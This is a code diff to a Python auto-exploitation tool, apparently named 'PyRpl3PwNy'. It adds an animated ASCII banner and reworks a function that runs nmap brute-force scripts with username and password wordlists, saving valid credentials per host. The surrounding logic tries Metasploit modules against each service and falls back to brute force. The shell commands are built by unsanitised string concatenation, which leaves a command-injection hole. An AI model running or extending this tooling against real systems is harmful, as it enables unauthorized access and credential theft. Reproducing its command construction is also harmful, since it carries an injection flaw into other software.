@@ -15,6 +15,47 @@ import pandas as pd
 import csv
 from io import StringIO
 
+
+def banner():
+	os.system('clear')
+	pwny = 0
+	while pwny < 10:
+		spaces = 8 * pwny * " "
+		print("   _____       _____        _      ____    _____           _   _")
+		print("  |  __ \\     |  __ \\      | |    |___ \\  |  __ \\         | \\ | |")
+		print("  | |__) |   _| |__) |_ __ | |      __) | | |__) |_      _|  \\| |_   _")
+		print("  |  ___/ | | |  _  /| '_ \\| |     |__ <  |  ___/\\ \\ /\\ / / . ` | | | |")
+		print("  | |   | |_| | | \\ \\| |_) | |____ ___) | | |     \\ V  V /| |\\  | |_| |")
+		print("  |_|    \\__,_|_|  \\_\\ .__/|______|____/  |_|      \\_/\\_/ |_| \\_|\\__, |")
+		print("                     | |                                          __/ |")
+		print("                     |_|                                         |___/")
+		print()
+		print(spaces + "             .'' ")
+		print(spaces + "   ._.-.___.' (`\\ ")
+		print(spaces + "  //(        ( `' ")
+		print(spaces + " '/ )\\ ).__. ) ")
+		print(spaces + " ' <' `\\ ._/'\\ ")
+		print(spaces + "    `   \\     \\ ")
+
+		time.sleep(1)
+		os.system('clear')
+		pwny += 1
+
+banner()
+
+print("   _____       _____        _      ____    _____           _   _")
+print("  |  __ \\     |  __ \\      | |    |___ \\  |  __ \\         | \\ | |                    .''")
+print("  | |__) |   _| |__) |_ __ | |      __) | | |__) |_      _|  \\| |_   _     ._.-.___.' (`\\")
+print("  |  ___/ | | |  _  /| '_ \\| |     |__ <  |  ___/\\ \\ /\\ / / . ` | | | |   //(        ( `'")
+print("  | |   | |_| | | \\ \\| |_) | |____ ___) | | |     \\ V  V /| |\\  | |_| |  '/ )\\ ).__. )")
+print("  |_|    \\__,_|_|  \\_\\ .__/|______|____/  |_|      \\_/\\_/ |_| \\_|\\__, |  ' <' `\\ ._/'\\")
+print("                     | |                                          __/ |     `   \\     \\")
+print("                     |_|                                         |___/")
+print()
+
+
+
+
 startTime = datetime.now()
 # save the cwd for use later
 startDir = os.path.dirname(os.path.realpath(sys.argv[0]))
@@ -86,10 +127,15 @@ def bruteforce(host, service, port):
 	bfResults = "failed"
 	userList = os.path.join(startDir, "bruteforce", "userList.txt")
 	passList = os.path.join(startDir, "bruteforce", "passList.txt")
-	bruteFile = os.path.join(startDir, str(host).replace(".","-"), service + str(port) + ".txt")
-	os.system("nmap --script " + service + "-brute -p" + str(port) + " " + str(host) + " --script-args userdb=" + userList + ",passdb=" + passList + " | grep 'Valid' >> " + bruteFile)
-	if os.stat(bruteFile).st_size > 0:
+	bruteFile = os.path.join(startDir, str(host).replace(".","-"), "bf-" + service + str(port) + ".txt")
+	os.system("touch " + bruteFile + "&& echo '" + service + " credentials for " + str(host) + " on port " + str(port) +"' >> " + bruteFile)
+	before = os.stat(bruteFile).st_size
+	#cmd = f'nmap --script {service} -brute -p {str(port)} {str(host)} --script-args userdb={userList},passdb={passList} | grep "Valid" | cut -c 7- | rev | cut -c 21- | rev >> {bruteFile}'
+	os.system("nmap --script " + service + "-brute -p" + str(port) + " " + str(host) + " --script-args userdb=" + userList + ",passdb=" + passList + " | grep 'Valid' | cut -c 7- | rev | cut -c 21- | rev >> " + bruteFile)
+	if os.stat(bruteFile).st_size > before:
 		bfResults = "exploited"
+	else:
+		os.system("rm " + bruteFile)
 	return bfResults
 
 
@@ -262,7 +308,7 @@ def exploitHost(host):
 			for job in client.jobs.list: # make sure all (if any) jobs are stopped
 				client.jobs.stop(job)
 			if service in bfServices: # service not yet exploited so see if we can bruteforce
-				print("  All modules failed. Attempting bruteforce on service: " + service)
+				print("  No successful MS modules. Attempting bruteforce on service: " + service)
 				if dfLen == 0: # if dfLen > 0 then this was already incremented from module testing
 					numServWithModsOrBrute += 1 # if not ^^ and bruteforcable then increment here
 				bruteResults = bruteforce(host, service, port)
@@ -272,7 +318,7 @@ def exploitHost(host):
 				else:
 					print("  Service on port " + str(port) + " not exploited by MS modules and bruteforce failed.")
 			else:
-				print("  Service on port " + str(port) + " not exploited by MS modules and is not bruteforcable.")
+				print("  Service on port " + str(port) + " not exploited by MS modules and is not brute-forceable.")
 		else:
 			print("  Service on port " + str(port) + " was exploited by MS modules!")
 
